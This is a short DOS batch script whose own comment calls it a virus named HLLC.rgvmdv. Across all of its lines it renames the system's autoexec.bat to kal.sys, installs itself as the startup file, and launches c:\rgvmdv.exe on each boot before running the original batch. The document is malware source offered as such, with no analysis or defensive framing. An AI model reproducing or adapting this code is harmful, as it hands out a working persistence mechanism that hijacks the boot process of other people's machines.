REM I don't want my virus to be called HLLC.rgvmdv but it is
if exist c:\kal.sys goto noinfect
REM
ren c:\autoexec.bat c:\kal.sys
ren c:\compan.bat c:\autoexec.bat
:noinfect
if exist c:\compan.bat del c:\compan.bat
@c:\rgvmdv.exe
ren kal.sys kal.bat
kal.bat
ren kal.bat kal.sys
